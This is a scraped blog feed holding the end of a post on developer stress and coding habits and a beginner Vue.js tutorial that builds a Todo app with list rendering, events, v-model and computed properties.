<p>If you are a front-end engineer you notice that new web frameworks pop up in a relative short time. However, the most popular ones are adopted by the industry and takes a while (a couple of years) to move away when new/‚Äúbetter‚Äù ones come along. So, don‚Äôt feel pressure if a new shiny tool is all the hype and you don‚Äôt know about it.</p>
<p>For backend and devOps there are paradigm changes from time to time. E.g. from monolith to microservices, from server rendered apps to SPA (single page applications) or hybrids. Also people are talking about severless, and the JAM Stack (JavaScript, APIs, and Markup). Docker and kubernetes are getting very popular right now. The list just keeps growing‚Ä¶</p>
<p>All in all, don‚Äôt feel like you need to rearchitect your stack right away and throw what‚Äôs working for something new. Prefer battle-tested solution for production env to shiny ones. Don‚Äôt follow the hype evaluate your use cases carefully. What worked for Google/Facebook don‚Äôt necessarily be the right tool for you. You can benchmark multiple tools before going all in and make a decision based on data rather than hype.</p>
<h2 id="Testing-üêû">Testing üêû<a href="#Testing-üêû" class="headerlink" title="Testing üêû"></a></h2><p>Test your code. Unit test and integration/e2e tests are not nice to have, they are a must if you want to sleep well at night. Even if your company has a QA team, try to write automated tests. Add test coverage tools and try to keep it as close to 100% as possible. That will reduce you a lot of stress chasing bugs in production and unexpected angry customers.</p>
<h2 id="Refactoring-üõ†">Refactoring üõ†<a href="#Refactoring-üõ†" class="headerlink" title="Refactoring üõ†"></a></h2><p>I have been battling my perfectionism for years. Every code I see that could be better, I feel the urge to modify it. Initially I did, and my number of changes got so big that when something broke it was hard to tell what‚Äôs wrong :(</p>
<p>Keep your changes small. It‚Äôs easier to review small pull requests (PR) than a large one. Divide big changes into multiple small ones if it makes sense.</p>
<p>Also, have respect for the working code. There might be clever ways to solve a task, however you don‚Äôt know if you are going to introduce new bugs.</p>
<p>This is what I follow:</p>
<ol>
<li>Make it work, first. You should try to add the new functionality and make it work. No refactor, no clever tricks but lots of tests. Open up a PR and get it merged.</li>
<li>Make it faster, later. Now that‚Äôs working and has tests, it‚Äôs time to get clever and refactor.</li>
</ol>
<!--
Google play affiliated program:
https://support.google.com/affiliate/answer/7188084?hl=en&ref_topic=7477733
-->
]]></content>
    
    <summary type="html">
    
      &lt;!-- draft date: 2018-12-19 16:20:36 --&gt;
&lt;p&gt;Most professions nowadays involve a certain degree of stress. We have deadlines, change of requirements at the last minute and to deal with people. On top of that, when you work in front of a computer 8+ hours additional stressors are added. Your eyes might get dry. Also the lack of movement might cause you back/neck pain, while your muscles shrink and your belly expands. This post will give you some tips to accomplish your goals without sacrificing your health. I also included some bonus tips for software engineers.&lt;/p&gt;
    
    </summary>
    
      <category term="Miscellaneous" scheme="https://adrianmejia.com/categories/Miscellaneous/"/>
    
    
      <category term="stress management" scheme="https://adrianmejia.com/tags/stress-management/"/>
    
  </entry>
  
  <entry>
    <title>Vue.js Tutorial for beginners</title>
    <link href="https://adrianmejia.com/blog/2018/08/04/Vue-js-Tutorial-for-beginners-Create-a-Todo-App/"/>
    <id>https://adrianmejia.com/blog/2018/08/04/Vue-js-Tutorial-for-beginners-Create-a-Todo-App/</id>
    <published>2018-08-05T01:30:22.000Z</published>
    <updated>2018-08-05T01:30:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>In this tutorial, you are going to learn the basics of Vue.js. While we learn, we are going to build a Todo app that will help us to put in practice what we learn.</p>
<a id="more"></a>
<p>A good way to learn a new framework, It‚Äôs by doing a Todo app. It‚Äôs an excellent way to compare framework features. It‚Äôs quick to implement and easy to understand. However, don‚Äôt be fooled by the simplicity, we are going to take it to the next level. We are going to explore advanced topics as well such as Vue Routing, Components, directives and many more!</p>
<p>Let‚Äôs first setup the dev environment, so we can focus on Vue! üññ</p>
<h1 id="Setup">Setup<a href="#Setup" class="headerlink" title="Setup"></a></h1><p>We are going to start with essential HTML elements and CSS files and no JavaScript. You will learn how to add all the JavaScript functionality using Vue.js.</p>
<p>To get started quickly, clone the following repo and check out the <code>start-here</code> branch:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/amejiarosario/vue-todo-app.git</span><br><span class="line"><span class="built_in">cd</span> vue-todo-app</span><br><span class="line">git checkout start-here</span><br><span class="line"></span><br><span class="line">npm install</span><br><span class="line">npm start</span><br></pre></td></tr></table></figure>
<p>After running <code>npm start</code>, your browser should open on port <code>http://127.0.0.1:8080</code> and show the todo app.</p>
<p><img src="/images/todo-app.jpg" alt="todo-app"></p>
<p>Try to interact with it. You cannot create a new Todos, nor can you delete them or edit them. We are going to implement that!</p>
<p>Open your favorite code editor (I recommend <a href="https://code.visualstudio.com/" target="_blank" rel="noopener">Code</a>) on <code>vue-todo-app</code> directory.</p>
<h2 id="Package-json">Package.json<a href="#Package-json" class="headerlink" title="Package.json"></a></h2><p>Take a look at the <code>package.json</code> dependencies:</p>
<figure class="highlight js"><figcaption><span>app.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"dependencies"</span>: &#123;</span><br><span class="line">  <span class="string">"todomvc-app-css"</span>: <span class="string">"2.1.2"</span>,</span><br><span class="line">  <span class="string">"vue"</span>: <span class="string">"2.5.17"</span>,</span><br><span class="line">  <span class="string">"vue-router"</span>: <span class="string">"3.0.1"</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">"devDependencies"</span>: &#123;</span><br><span class="line">  <span class="string">"live-server"</span>: <span class="string">"1.2.0"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We installed <code>Vue</code> and <code>VueRouter</code> dependencies. Also, we have the nice CSS library for Todo apps and <code>live-server</code> to serve and reload the page when we make changes. That‚Äôs all we would need for this tutorial.</p>
<h2 id="index-html">index.html<a href="#index-html" class="headerlink" title="index.html"></a></h2><p>Open the <code>index.html</code> file.  There we have the basic HTML structure for the Todo app that we are going to build upon:</p>
<ul>
<li>Line 9: Loads the CSS from NPM module <code>node_modules/todomvc-app-css/index.css</code>.</li>
<li>Line 23: We have the <code>ul</code> and some hard-coded todo lists. We are going to change this in a bit.</li>
<li>Line 73: we have multiple script files that load Vue, VueRouter and an empty <code>app.js</code>.</li>
</ul>
<p>Now, you know the basic structure where we are going to work on. Let‚Äôs get started with Vue! üññ</p>
<h1 id="Getting-started-with-Vue">Getting started with Vue<a href="#Getting-started-with-Vue" class="headerlink" title="Getting started with Vue"></a></h1><p>As you might know‚Ä¶</p>
<blockquote>
<p>Vue.js is a <em>reactive</em> JavaScript framework to build UI components.</p>
</blockquote>
<p>It‚Äôs reactive because the data and the DOM are linked. That means, that when data changes, it automatically updates the DOM. Let‚Äôs try that!</p>
<h2 id="Vue-Data-amp-v-text">Vue Data &amp; v-text<a href="#Vue-Data-amp-v-text" class="headerlink" title="Vue Data &amp; v-text"></a></h2><p>Go to <code>app.js</code> and type the following:</p>
<figure class="highlight js"><figcaption><span>app.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> todoApp = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">'.todoapp'</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    title: <span class="string">'Hello Vue!'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>The <code>el</code> is the element where Vue is going to be mounted. If you notice in the <code>index.html</code> that‚Äôs the section part. The <code>data</code> object is reactive. It keeps track of changes and re-render the DOM if needed. Go to the index page and change <code>&lt;h1&gt;todos&lt;/h1&gt;</code> for <code>&lt;h1&gt;{{ title }}&lt;/h1&gt;</code>. The rest remains the same:</p>
<figure class="highlight js"><figcaption><span>index.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;section <span class="class"><span class="keyword">class</span></span>=<span class="string">"todoapp"</span>&gt;</span><br><span class="line">  &lt;header <span class="class"><span class="keyword">class</span></span>=<span class="string">"header"</span>&gt;</span><br><span class="line marked">    &lt;h1&gt;&#123;&#123; title &#125;&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">    &lt;input class="new-todo" placeholder="What needs to be done?" autofocus&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>header&gt;</span><br><span class="line">  &lt;!--  ...  --&gt;</span><br></pre></td></tr></table></figure>
<p>If you have <code>npm start</code> running you will see that the title changed!</p>
<p>You can also go to the console and change it <code>todoApp.title = &quot;Bucket List&quot;</code> and see that it updates the DOM.</p>
<p><img src="/images/vue-reactive.gif" alt="vue"></p>
<p>Note: besides the curly braces you can also use <code>v-text</code>:</p>
<figure class="highlight html"><figcaption><span>index.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-text</span>=<span class="string">"title"</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Let‚Äôs do something useful and put an initial todo list:</p>
<figure class="highlight js"><figcaption><span>app.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> todoApp = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">'.todoapp'</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    title: <span class="string">'Todos'</span>,</span><br><span class="line">    todos: [</span><br><span class="line">      &#123; <span class="attr">text</span>: <span class="string">'Learn JavaScript ES6+ goodies'</span>, <span class="attr">isDone</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">text</span>: <span class="string">'Learn Vue'</span>, <span class="attr">isDone</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">text</span>: <span class="string">'Build something awesome'</span>, <span class="attr">isDone</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>Now that we have the list we need to replace the <code>&lt;li&gt;</code> elements with each of the elements in the <code>data.todos</code> array.</p>
<p>Let‚Äôs do the CRUD (Create-Read-Update-Delete) of a Todo application.</p>
<p><a href="https://github.com/amejiarosario/vue-todo-app/commit/2d1f2e5" target="_blank" rel="noopener">review diff</a></p>
<h2 id="READ-List-rendering-with-v-for">READ: List rendering with <code>v-for</code><a href="#READ-List-rendering-with-v-for" class="headerlink" title="READ: List rendering with v-for"></a></h2><p>As you can see everything starting with <code>v-</code> is defined by the Vue library.</p>
<p>We can iterate through elements using <code>v-for</code> as follows:</p>
<figure class="highlight html"><figcaption><span>index.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"todo in todos"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"view"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"toggle"</span> <span class="attr">type</span>=<span class="string">"checkbox"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>&#123;&#123;todo.text&#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"destroy"</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"edit"</span> <span class="attr">value</span>=<span class="string">"Rule the web"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>You can remove the other <code>&lt;li&gt;</code> tag that was just a placeholder.</p>
<p><a href="https://github.com/amejiarosario/vue-todo-app/commit/3dc4871" target="_blank" rel="noopener">review diff</a></p>
<h2 id="CREATE-Todo-and-event-directives">CREATE Todo and event directives<a href="#CREATE-Todo-and-event-directives" class="headerlink" title="CREATE Todo and event directives"></a></h2><p>We are going to implement the create functionality. We have a textbox, and when we press enter, we would like to add whatever we typed to the list.</p>
<p>In Vue, we can listen to an event using <code>v-on:EVENT_NAME</code>. E.g.:</p>
<ul>
<li>v-on:click</li>
<li>v-on:dbclick</li>
<li>v-on:keyup</li>
<li>v-on:keyup.enter</li>
</ul>
<p><strong>Protip</strong>: since <code>v-on:</code> is used a lot, there‚Äôs a shortcut <code>@</code>. E.g. Instead of <code>v-on:keyup.enter</code> it can be <a href="mailto:`@keyup.enter" target="_blank" rel="noopener">`@keyup.enter</a>`.</p>
<p>Let‚Äôs use the <code>keyup.enter</code> to create a todo:</p>
<figure class="highlight html"><figcaption><span>index.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"new-todo"</span> <span class="attr">placeholder</span>=<span class="string">"What needs to be done?"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">v-on:keyup.enter</span>=<span class="string">"createTodo"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>On <code>enter</code> we are calling <code>createTodo</code> method, but it‚Äôs not defined yet. Let‚Äôs define it on <code>app.js</code> as follows:</p>
<figure class="highlight js"><figcaption><span>app.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">methods: &#123;</span><br><span class="line">  createTodo(event) &#123;</span><br><span class="line">    <span class="keyword">const</span> textbox = event.target;</span><br><span class="line">    <span class="keyword">this</span>.todos.push(&#123; <span class="attr">text</span>: textbox.value, <span class="attr">isDone</span>: <span class="literal">false</span> &#125;);</span><br><span class="line">    textbox.value = <span class="string">''</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/amejiarosario/vue-todo-app/commit/fcd305c" target="_blank" rel="noopener">review diff</a></p>
<h2 id="Applying-classes-dynamically-amp-Vue-v-bind">Applying classes dynamically &amp; Vue <code>v-bind</code><a href="#Applying-classes-dynamically-amp-Vue-v-bind" class="headerlink" title="Applying classes dynamically &amp; Vue v-bind"></a></h2><p>If you click the checkbox (or checkcirlcle) we would like the class <code>completed</code> to be applied to the element. We can accomplish this by using the <code>v-bind</code> directive.</p>
<p><code>v-bind</code> can be applied to any HTML attribute such as <code>class</code>, <code>title</code> and so forth. Since <code>v-bind</code> is used a lot we can have a shortcut <code>:</code>, so instead of <code>v-bind:class</code> it becomes <code>:class</code>.</p>
<figure class="highlight html"><figcaption><span>index.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"todo in todos"</span> <span class="attr">:class</span>=<span class="string">"&#123; completed: todo.isDone &#125;"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Now if a Todo list is completed, it will become cross out. However, if we click on the checkbox, it doesn‚Äôt update the <code>isDone</code> property.  Let‚Äôs fix that next.</p>
<p><a href="https://github.com/amejiarosario/vue-todo-app/commit/2145c36" target="_blank" rel="noopener">review diff</a></p>
<h2 id="Keep-DOM-and-data-in-sync-with-Vue-v-model">Keep DOM and data in sync with Vue v-model<a href="#Keep-DOM-and-data-in-sync-with-Vue-v-model" class="headerlink" title="Keep DOM and data in sync with Vue v-model"></a></h2><p>The todos have a property called <code>isDone</code> if it‚Äôs true we want the checkbox to be marked. That‚Äôs data -&gt; DOM. We also want if we change the DOM (click the checkbox) we want to update the data (DOM -&gt; data). This bi-directional communication is easy to do using <code>v-model</code>, it will keep it in sync for you!</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"toggle"</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">v-model</span>=<span class="string">"todo.isDone"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>If you test the app now, you can see when you click the checkbox; also the text gets cross out. Yay!</p>
<p>You can also go to the console and verify that if you change the data directly, it will immediately update the HTML. Type the following in the browser console where you todo app is running:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">todoApp.todos[2].isDone = true</span><br></pre></td></tr></table></figure>
<p>You should see the update. Cool!</p>
<h2 id="UPDATE-todo-list-with-a-double-click">UPDATE todo list with a double-click<a href="#UPDATE-todo-list-with-a-double-click" class="headerlink" title="UPDATE todo list with a double-click"></a></h2><p>We want to double click on any list and that it automatically becomes a checkbox. We have some CSS magic to do that, the only thing we need to do is to apply the <code>editing</code> class.</p>
<figure class="highlight html"><figcaption><span>index.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- List items should get the class `editing` when editing and `completed` when marked as completed --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"todo in todos"</span> <span class="attr">:class</span>=<span class="string">"&#123; completed: todo.isDone &#125;"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"view"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"toggle"</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">v-model</span>=<span class="string">"todo.isDone"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>&#123;&#123;todo.text&#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"destroy"</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"edit"</span> <span class="attr">value</span>=<span class="string">"Rule the web"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Similar to what we did with the <code>completed</code> class, we need to add a condition when we start editing.</p>
<p>Starting with the label, we want to start editing when we double-click on it. Vue provides <code>v-on:dblclick</code> or shorthand <code>@dblclick</code>:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span> @<span class="attr">dblclick</span>=<span class="string">"startEditing(todo)"</span>&gt;</span>&#123;&#123;todo.text&#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>In the <code>app.js</code> we can define start editing as follows:</p>
<figure class="highlight js"><figcaption><span>app.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> todoApp = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">'.todoapp'</span>,</span><br><span class="line">  data: &#123;</span><br><span class="line">    title: <span class="string">'Todos'</span>,</span><br><span class="line">    todos: [</span><br><span class="line">      &#123; <span class="attr">text</span>: <span class="string">'Learn JavaScript ES6+ goodies'</span>, <span class="attr">isDone</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">text</span>: <span class="string">'Learn Vue'</span>, <span class="attr">isDone</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">      &#123; <span class="attr">text</span>: <span class="string">'Build something awesome'</span>, <span class="attr">isDone</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">    ],</span><br><span class="line">    editing: <span class="literal">null</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    createTodo(event) &#123;</span><br><span class="line">      <span class="keyword">const</span> textbox = event.target;</span><br><span class="line">      <span class="keyword">this</span>.todos.push(&#123; <span class="attr">text</span>: textbox.value, <span class="attr">isDone</span>: <span class="literal">false</span> &#125;);</span><br><span class="line">      textbox.value = <span class="string">''</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    startEditing(todo) &#123;</span><br><span class="line">      <span class="keyword">this</span>.editing = todo;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>We created a new variable <code>editing</code> in data. We just set whatever todo we are currently editing. We want only to edit one at a time, so this works perfectly. When you double-click the label, the <code>startEditing</code> function is called and set the <code>editing</code> variable to the current todo element.</p>
<p>Next, we need to apply the <code>editing</code> class:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"todo in todos"</span> <span class="attr">:class</span>=<span class="string">"&#123; completed: todo.isDone, editing: todo === editing &#125;"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>When <code>data.editing</code> matches the <code>todo</code> , then we apply the CSS class. Try it out!</p>
<p>If you try it out, you will notice you can enter on edit mode, but there‚Äôs no way to exit from it (yet). Let‚Äôs fix that.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"edit"</span></span></span><br><span class="line"><span class="tag">  @<span class="attr">keyup.esc</span>=<span class="string">"cancelEditing"</span></span></span><br><span class="line"><span class="tag">  @<span class="attr">keyup.enter</span>=<span class="string">"finishEditing"</span></span></span><br><span class="line"><span class="tag">  @<span class="attr">blur</span>=<span class="string">"finishEditing"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">:value</span>=<span class="string">"todo.text"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>First, we want the input textbox to have the <code>value</code> of the <code>todo.text</code> when we enter to the editing mode. We can accomplish this using <code>:value=&quot;todo.text&quot;</code>. Remember that colon <code>:</code> is a shorthand for <code>v-bind</code>.</p>
<p>Before, we implemented the <code>startEditing</code> function. Now, we need to complete the edit functionality with these two more methods:</p>
<ul>
<li><code>finishEditing</code>: applies changes to the <code>todo.text</code>. This is triggered by pressing <kbd>enter</kbd> or clicking elsewhere (blur).</li>
<li><code>cancelEditing</code>: discard the changes and leave <code>todos</code> list untouched. This happens when you press the <kbd>esc</kbd> key.</li>
</ul>
<p>Let‚Äôs go to the <code>app.js</code> and define these two functions.</p>
<figure class="highlight js"><figcaption><span>app.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">finishEditing(event) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">this</span>.editing) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line">  <span class="keyword">const</span> textbox = event.target;</span><br><span class="line">  <span class="keyword">this</span>.editing.text = textbox.value;</span><br><span class="line">  <span class="keyword">this</span>.editing = <span class="literal">null</span>;</span><br><span class="line">&#125;,</span><br><span class="line">cancelEditing() &#123;</span><br><span class="line">  <span class="keyword">this</span>.editing = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Cancel is pretty straightforward. It just set editing to null.</p>
<p><code>finishEditing</code> will take the input current‚Äôs value (event.target.value) and copy over the todo element that is currently being edited. That‚Äôs it!</p>
<p><a href="https://github.com/amejiarosario/vue-todo-app/commit/4af7d31" target="_blank" rel="noopener">review diff</a></p>
<h2 id="DELETE-todo-list-on-click-event">DELETE todo list on @click event<a href="#DELETE-todo-list-on-click-event" class="headerlink" title="DELETE todo list on @click event"></a></h2><p>Finally, the last step to complete the CRUD operations is deleting. We are going to listen for click events on the destroy icon:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"destroy"</span> @<span class="attr">click</span>=<span class="string">"destroyTodo(todo)"</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>also, <code>destroyTodo</code> implementation is as follows:</p>
<figure class="highlight js"><figcaption><span>app.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">destroyTodo(todo) &#123;</span><br><span class="line">  <span class="keyword">const</span> index = <span class="keyword">this</span>.todos.indexOf(todo);</span><br><span class="line">  <span class="keyword">this</span>.todos.splice(index, <span class="number">1</span>);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/amejiarosario/vue-todo-app/commit/a73e058" target="_blank" rel="noopener">review diff</a></p>
<h2 id="Trimming-inputs">Trimming inputs<a href="#Trimming-inputs" class="headerlink" title="Trimming inputs"></a></h2><p>It‚Äôs always a good idea to <code>trim</code> user inputs, so any accidental whitespace doesn‚Äôt get in the way with <code>textbox.value.trim()</code>.</p>
<p><a href="https://github.com/amejiarosario/vue-todo-app/commit/45b4eed44abd9a4cfec3b3977b61fe7031ff6c4e" target="_blank" rel="noopener">review diff</a></p>
<h2 id="Items-left-count-with-computed-properties">Items left count with  <code>computed</code> properties<a href="#Items-left-count-with-computed-properties" class="headerlink" title="Items left count with  computed properties"></a></h2><p>Right now the <code>item left</code> count is always 0. We want the number of remaining tasks.  We could do something like this:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span>&#123;&#123; todos.filter(t =&gt; !t.isDone).length &#125;&#125;<span class="tag">&lt;/<span class="name">strong</span>&gt;</span> item(s) left<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>That‚Äôs a little ugly to stick out all that logic into the template. That‚Äôs why Vue has the <code>computed</code>  section!</p>
<figure class="highlight js"><figcaption><span>app.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">computed: &#123;</span><br><span class="line">  activeTodos() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.todos.filter(<span class="function"><span class="params">t</span> =&gt;</span> !t.isDone);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Now the template is cleaner:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span>&#123;&#123; activeTodos.length &#125;&#125;<span class="tag">&lt;/<span class="name">strong</span>&gt;</span> item(s) left<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>You might ask, why use a computed property when we can create a method instead?</p>
<blockquote>
<p>Computed vs. Methods. Computed properties are <strong>cached</strong> and updated when their dependencies changes. The computed property would return immediately without having to evaluate the function if no changes happened. On the other hand, Methods will <strong>always</strong> run the function.</p>
</blockquote>
<p>Try completing other tasks and verify that the count gets updated.</p>
<p><img src="/images/items-left.gif" alt="items-left"></p>
